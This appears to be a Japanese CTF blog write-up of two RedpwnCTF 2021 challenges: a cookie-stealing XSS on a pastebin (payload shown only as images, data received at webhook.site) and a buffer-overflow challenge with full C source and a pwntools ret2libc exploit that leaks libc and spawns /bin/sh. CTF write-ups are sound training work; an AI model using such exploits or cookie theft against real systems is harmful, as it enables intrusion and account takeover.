@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>RedpwnCTF 2021 Writeup - CTF フラxxグゲット</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="CaptureAmerica @ CTF フラxxグゲット" /><meta name="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.redpwn.net/ 1146点を獲得し、最終順位は317位でした。 解いたチャレンジ 最近たまに見るこの rCTF という Platform は redpwn CTF team が作ったもの" /><meta name="keywords" content="CTF, Writeup, captureamerica, picoCTF" />
+
+
+
+<meta name="google-site-verification" content="PqctLWZQttGzxXVupWuIt2HWuBI8cvN1z07ETpxA2dw" />
+
+
+<meta name="generator" content="Hugo 0.74.2 with theme even" />
+
+
+<link rel="canonical" href="https://captureamerica.github.io/writeups/post/redpwnctf_2021/" />
+<link rel="apple-touch-icon" sizes="180x180" href="https://captureamerica.github.io/writeups/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://captureamerica.github.io/writeups/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="https://captureamerica.github.io/writeups/favicon-16x16.png">
+<link rel="manifest" href="https://captureamerica.github.io/writeups/manifest.json">
+<link rel="mask-icon" href="https://captureamerica.github.io/writeups/safari-pinned-tab.svg" color="#5bbad5">
+
+
+
+<link href="https://captureamerica.github.io/writeups/sass/main.min.2e81bbed97b8b282c1aeb57488cc71c8d8c8ec559f3931531bd396bf31e0d4dd.css" rel="stylesheet">
+
+
+
+<meta property="og:title" content="RedpwnCTF 2021 Writeup" />
+<meta property="og:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.redpwn.net/ 1146点を獲得し、最終順位は317位でした。 解いたチャレンジ 最近たまに見るこの rCTF という Platform は redpwn CTF team が作ったもの" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://captureamerica.github.io/writeups/post/redpwnctf_2021/" />
+<meta property="article:published_time" content="2021-07-17T09:00:00+09:00" />
+<meta property="article:modified_time" content="2021-07-17T09:00:00+09:00" />
+<meta itemprop="name" content="RedpwnCTF 2021 Writeup">
+<meta itemprop="description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.redpwn.net/ 1146点を獲得し、最終順位は317位でした。 解いたチャレンジ 最近たまに見るこの rCTF という Platform は redpwn CTF team が作ったもの">
+<meta itemprop="datePublished" content="2021-07-17T09:00:00&#43;09:00" />
+<meta itemprop="dateModified" content="2021-07-17T09:00:00&#43;09:00" />
+<meta itemprop="wordCount" content="720">
+
+
+
+<meta itemprop="keywords" content="CTF," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="RedpwnCTF 2021 Writeup"/>
+<meta name="twitter:description" content="Save The Earth! - 地球環境を守ろう！ URL: https://2021.redpwn.net/ 1146点を獲得し、最終順位は317位でした。 解いたチャレンジ 最近たまに見るこの rCTF という Platform は redpwn CTF team が作ったもの"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="https://captureamerica.github.io/writeups/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="https://captureamerica.github.io/writeups/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="https://captureamerica.github.io/writeups/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="https://captureamerica.github.io/writeups/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="https://captureamerica.github.io/writeups/about/">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+
+  
+
+
+</nav>
+
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="https://captureamerica.github.io/writeups/" class="logo">CTF Writeups</a>
+</div>
+
+
+
+
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="https://captureamerica.github.io/writeups/about/">About</a>
+      </li>
+  </ul>
+</nav>
+
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">RedpwnCTF 2021 Writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2021-07-17 </span>
+        <div class="post-category">
+            <a href="https://captureamerica.github.io/writeups/categories/ctf/"> CTF </a>
+            </div>
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">Contents</h2>
+  <div class="post-toc-content">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#web-pastebin-1-about-100-points">[Web]: pastebin-1 (about 100 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn-ret2the-unknown-about-100-points">[Pwn]: ret2the-unknown (about 100 points)</a>
+      <ul>
+        <li><a href="#challenge-1">Challenge</a></li>
+        <li><a href="#solution-1">Solution</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div>
+    <div class="post-content">
+      <img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
+<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
+<div class='align-right'>
+<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fredpwnctf_2021%2F">
+<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
+</a>
+</div>
+<p>URL: <a href="https://2021.redpwn.net/">https://2021.redpwn.net/</a>
+<br /><br /></p>
+<p>1146点を獲得し、最終順位は317位でした。<br /></p>
+<img src="https://captureamerica.github.io/writeups/img/redpwnctf_2021_score.png" alt="redpwnctf_2021_score.png">
+<p>解いたチャレンジ<br /></p>
+<img src="https://captureamerica.github.io/writeups/img/redpwnctf_2021_solves1.png" alt="redpwnctf_2021_solves1.png">
+<p><br /><br /></p>
+<p>最近たまに見るこの <a href="https://rctf.redpwn.net/">rCTF</a> という Platform は redpwn CTF team が作ったものみたいですね。</p>
+<p><br /><br />
+自分の過去のブログを見たときに、<a href="https://captureamerica.github.io/writeups/post/redpwnctf_2019/">RedpwnCTF 2019 の Writeup</a> は書いてたけど RedpwnCTF 2020 の Writeup が無かったので、去年はイベントを見逃したのかな？と思ったら、パソコン上にメモは残っていたのでいちおう参加はしてたみたいです。簡単なのしか解いていなかったからブログを書かなかったのかな。</p>
+<p>そして、今年も簡単なのしか解いていないですが、とりあえず少しだけ記録として残しておきます。</p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="web-pastebin-1-about-100-points">[Web]: pastebin-1 (about 100 points)</h2>
+<hr>
+<h3 id="challenge">Challenge</h3>
+<blockquote>
+<p>Ah, the classic pastebin. Can you get the admin&rsquo;s cookies?
+<br /><br />
+pastebin-1.mc.ax  (pastebinへのリンク)
+<br /><br />
+Admin bot  (admin botへのリンク)</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>main.rs</li>
+</ul>
+<br>
+<h3 id="solution">Solution</h3>
+<p><a href="https://webhook.site/">https://webhook.site/</a> を使って解きました。</p>
+<ol>
+<li>
+<p>webhook.site で待受けを開始してアドレスを取得。</p>
+</li>
+<li>
+<p>以下をPastebinのところにPost。<br>
+<img src="https://captureamerica.github.io/writeups/img/redpwnctf_2021_pastebin1.png" alt="redpwnctf_2021_pastebin1.png"></p>
+</li>
+<li>
+<p>admin-botから、以下 (PastebinにPostしたときに得られるアドレス) へアクセス。<br>
+<img src="https://captureamerica.github.io/writeups/img/redpwnctf_2021_pastebin2.png" alt="redpwnctf_2021_pastebin2.png"></p>
+</li>
+<li>
+<p>webhook.site で受信したデータを確認。<br>
+<img src="https://captureamerica.github.io/writeups/img/redpwnctf_2021_pastebin3.png" alt="redpwnctf_2021_pastebin3.png"></p>
+</li>
+</ol>
+<p><br /></p>
+<p>Flag: <code>flag{d1dn7_n33d_70_b3_1n_ru57}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<h2 id="pwn-ret2the-unknown-about-100-points">[Pwn]: ret2the-unknown (about 100 points)</h2>
+<hr>
+<h3 id="challenge-1">Challenge</h3>
+<blockquote>
+<p>hey, my company sponsored map doesn&rsquo;t show any location named &ldquo;libc&rdquo;!
+<br /><br />
+nc mc.ax 31568</p>
+</blockquote>
+<p>Attachment:</p>
+<ul>
+<li>libc-2.28.so</li>
+<li>ld-2.28.so</li>
+<li>ret2the-unknown (ELF 64bit)</li>
+<li>ret2the-unknown.c</li>
+</ul>
+<p>ret2the-unknown.c の中身：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">your_reassuring_and_comforting_we_will_arrive_safely_in_libc</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
+
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;that board meeting was a *smashing* success! rob loved the challenge!&#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;in fact, he loved it so much he sponsored me a business trip to this place called &#39;libc&#39;...&#34;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;where is this place? can you help me get there safely?&#34;</span><span class="p">);</span>
+
+  <span class="c1">// please i cant afford the medical bills if we crash and segfault
+</span><span class="c1"></span>  <span class="n">gets</span><span class="p">(</span><span class="n">your_reassuring_and_comforting_we_will_arrive_safely_in_libc</span><span class="p">);</span>
+
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;phew, good to know. shoot! i forgot!&#34;</span><span class="p">);</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&#34;rob said i&#39;d need this to get there: %llx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">printf</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&#34;good luck!&#34;</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><br>
+<h3 id="solution-1">Solution</h3>
+<p>以下、checksecの出力結果です。</p>
+<pre>
+$ checksec ret2the-unknown
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</pre>
+<br>
+<p>以下、ほとんど今までのコードの使いまわしです。。。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python</span>
+<span class="c1"># -*- coding:utf-8 -*-</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">&#39;linux&#39;</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">&#39;amd64&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;critical&#39;</span>
+
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./ret2the-unknown&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;mc.ax&#39;</span><span class="p">,</span> <span class="mi">31568</span><span class="p">)</span>
+
+<span class="n">bufsize</span> <span class="o">=</span> <span class="mi">32</span> <span class="o">+</span> <span class="mi">8</span>
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">puts</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">main</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;safely?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">bufsize</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;luck!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+<span class="k">print</span><span class="p">(</span><span class="s1">&#39;puts: </span><span class="si">%x</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="n">puts</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.28.so&#39;</span><span class="p">)</span>
+<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="o">.</span><span class="n">puts</span>
+
+<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">libc</span><span class="p">)</span>
+<span class="n">rop</span><span class="o">.</span><span class="n">execv</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">)),</span> <span class="mi">0</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;safely?</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="n">bufsize</span> <span class="o">+</span> <span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;luck!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>	</code></pre></td></tr></table>
+</div>
+</div>
+<p><br /></p>
+<p>Flag: <code>flag{rob-is-proud-of-me-for-exploring-the-unknown-but-i-still-cant-afford-housing}</code></p>
+<p><br /><br />
+<br /><br /></p>
+<hr>
+<p><br /><br />
+<br /><br /></p>
+
+    </div>
+
+    <div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">Author</span>
+    <span class="item-content">CaptureAmerica @ CTF フラxxグゲット</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">LastMod</span>
+    <span class="item-content">
+        2021-07-17
+        
+    </span>
+  </p>
+  
+  
+</div>
+<footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://captureamerica.github.io/writeups/tags/ctf/">CTF</a>
+          </div>
+      <nav class="post-nav">
+        
+        <a class="next" href="https://captureamerica.github.io/writeups/post/hsctf8_2021/">
+            <span class="next-text nav-default">HSCTF8 Writeup</span>
+            <span class="next-text nav-mobile">Next</span>
+            <i class="iconfont icon-right"></i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="https://github.com/CaptureAmerica/" class="iconfont icon-github" title="github"></a>
+  <a href="https://captureamerica.github.io/writeups/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    Powered by <a class="hexo-link" href="https://gohugo.io">Hugo</a>
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    Theme - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021<span class="heart"><i class="iconfont icon-heart"></i></span><span>CaptureAmerica @ CTF フラxxグゲット</span>
+  </span>
+</div>
+
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  
+
+
+
+<script type="text/javascript" src="https://captureamerica.github.io/writeups/js/main.min.c12618f9a600c40bd024996677e951e64d3487006775aeb22e200c990006c5c7.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-104910699-2', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
